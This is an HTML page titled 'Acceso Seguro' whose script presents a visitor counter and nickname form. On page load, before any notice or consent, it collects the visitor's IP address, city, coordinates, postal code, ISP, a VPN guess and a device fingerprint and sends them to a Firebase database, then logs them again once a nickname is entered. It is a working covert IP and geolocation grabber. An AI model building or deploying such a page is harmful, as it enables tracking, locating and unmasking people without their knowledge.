<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Acceso Seguro</title>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { 
  getFirestore, doc, runTransaction, addDoc, collection 
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBIp6rof_Wa5wyWdJQwjYWOQRu86ghZjtM",
  authDomain: "track-5ec5f.firebaseapp.com",
  projectId: "track-5ec5f"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const wait = (ms) => new Promise(r => setTimeout(r, ms));

// 🧠 anti-freeze
async function safe(promise, fallback) {
  try {
    return await Promise.race([
      promise,
      new Promise(resolve => setTimeout(() => resolve(fallback), 5000))
    ]);
  } catch {
    return fallback;
  }
}

// 🌐 IP + GEO COMPLETO
async function getIPData() {

  async function fetchSafe(url) {
    try {
      let res = await fetch(url);
      return await res.json();
    } catch {
      return null;
    }
  }

  let data = await safe(fetchSafe("https://ipapi.co/json/"), null);
  if (!data) data = await safe(fetchSafe("https://ipwho.is/"), null);
  if (!data) data = await safe(fetchSafe("https://ipinfo.io/json"), null);

  if (!data) {
    return {
      ipv4: "No disponible",
      ipv6: "No disponible",
      ciudad: "Desconocido",
      region: "Desconocido",
      pais: "Desconocido",
      isp: "Desconocido",
      timezone: "Desconocido",
      lat: "N/A",
      lon: "N/A",
      postal: "N/A",
      vpn: false
    };
  }

  let ip = data.ip || data.query || "No disponible";

  // 📍 GEO
  let lat =
    data.latitude ||
    data.lat ||
    (data.loc ? data.loc.split(",")[0] : "N/A");

  let lon =
    data.longitude ||
    data.lon ||
    (data.loc ? data.loc.split(",")[1] : "N/A");

  let ciudad = data.city || "Desconocido";
  let region = data.region || data.regionName || "Desconocido";
  let pais = data.country_name || data.country || "Desconocido";
  let isp = data.org || data.isp || "Desconocido";
  let timezone = data.timezone || "Desconocido";
  let postal = data.postal || data.zip || "N/A";

  // 🔥 FORZAR IPv4 REAL
  let ipv4 = "No disponible";
  try {
    let v4 = await safe(fetch("https://api.ipify.org?format=json").then(r=>r.json()), null);
    if (v4?.ip && v4.ip.includes(".")) {
      ipv4 = v4.ip;
    }
  } catch {}

  // 🕵️ VPN
  let vpn = false;
  let ispLow = (isp || "").toLowerCase();

  if (data.proxy === true) vpn = true;

  if (
    ispLow.includes("amazon") ||
    ispLow.includes("google") ||
    ispLow.includes("digitalocean") ||
    ispLow.includes("microsoft") ||
    ispLow.includes("cloudflare") ||
    ispLow.includes("oracle")
  ) vpn = true;

  return {
    ipv4,
    ipv6: ip.includes(":") ? ip : "No disponible",
    ciudad,
    region,
    pais,
    isp,
    timezone,
    lat,
    lon,
    postal,
    vpn
  };
}

// 🔢 contador
async function getVisitorNumber() {
  try {
    const ref = doc(db, "meta", "contador");

    return await safe(runTransaction(db, async (transaction) => {
      const snap = await transaction.get(ref);
      let numero = snap.exists() ? snap.data().valor + 1 : 1;
      transaction.set(ref, { valor: numero });
      return numero;
    }), Math.floor(Math.random() * 9999));

  } catch {
    return Math.floor(Math.random() * 9999);
  }
}

// 💻 dispositivo
function getDevice() {
  return {
    userAgent: navigator.userAgent,
    idioma: navigator.language,
    resolucion: screen.width + "x" + screen.height,
    plataforma: navigator.platform,
    nucleosCPU: navigator.hardwareConcurrency || "N/A",
    memoriaRAM: navigator.deviceMemory || "N/A"
  };
}

// 🚀 INICIO
let datosBase = {};
let visitanteNumero = 0;

document.body.innerHTML = "<h2>Conectando...</h2>";

(async () => {

  await wait(400);
  document.body.innerHTML = "<h2>Analizando conexión... ⏳</h2>";

  let [ip, numero] = await Promise.all([
    getIPData(),
    getVisitorNumber()
  ]);

  visitanteNumero = numero;

  datosBase = {
    visitante: visitanteNumero,
    ...ip,
    ...getDevice(),
    fecha: new Date().toISOString()
  };

  safe(addDoc(collection(db, "En bruto"), datosBase), null);

  await wait(300);

  document.body.innerHTML = `
    <h1>Sistema de registro</h1>
    <p>Eres el visitante #${visitanteNumero}</p>
    <input id="nick" placeholder="Tu apodo">
    <br><br>
    <button id="btn">Continuar</button>
  `;

  document.getElementById("btn").onclick = guardar;

})();

// 💾 guardar
async function guardar() {

  let nick = document.getElementById("nick").value || "Anónimo";

  document.body.innerHTML = "<h2>Procesando...</h2>";

  let datosFinal = { ...datosBase, nick };

  safe(addDoc(collection(db, "logs"), datosFinal), null);

  let avisoVPN = datosFinal.vpn
    ? "<span style='color:red;'>⚠ VPN DETECTADO</span>"
    : "<span style='color:lime;'>✔ Red normal</span>";

  let tipoRed = datosFinal.ipv4 !== "No disponible"
    ? "Dual Stack (IPv4 + IPv6)"
    : "IPv6 nativa";

  document.body.innerHTML = `
    <h1>✔ Registrado</h1>
    <p>ID: #${datosFinal.visitante}</p>
    <p>Usuario: ${nick}</p>

    <br>
    <p>IPv4: ${datosFinal.ipv4}</p>
    <p>IPv6: ${datosFinal.ipv6}</p>
    <p>Tipo de red: ${tipoRed}</p>
    <p>${avisoVPN}</p>

    <br>
    <p>${datosFinal.ciudad}, ${datosFinal.region}, ${datosFinal.pais}</p>
    <p>Lat: ${datosFinal.lat} | Lon: ${datosFinal.lon}</p>
    <p>Postal: ${datosFinal.postal}</p>
    <p>Zona horaria: ${datosFinal.timezone}</p>
    <p>ISP: ${datosFinal.isp}</p>

    <br>
    <p>Idioma: ${datosFinal.idioma}</p>
    <p>Resolución: ${datosFinal.resolucion}</p>
    <p>Plataforma: ${datosFinal.plataforma}</p>
    <p>CPU: ${datosFinal.nucleosCPU}</p>
    <p>RAM: ${datosFinal.memoriaRAM} GB</p>

    <br>
    <p style="font-size:10px;">${datosFinal.userAgent}</p>
  `;
}

</script>
</head>

<body style="background:black;color:#00ff00;font-family:monospace;text-align:center;margin-top:50px;">
</body>
</html>
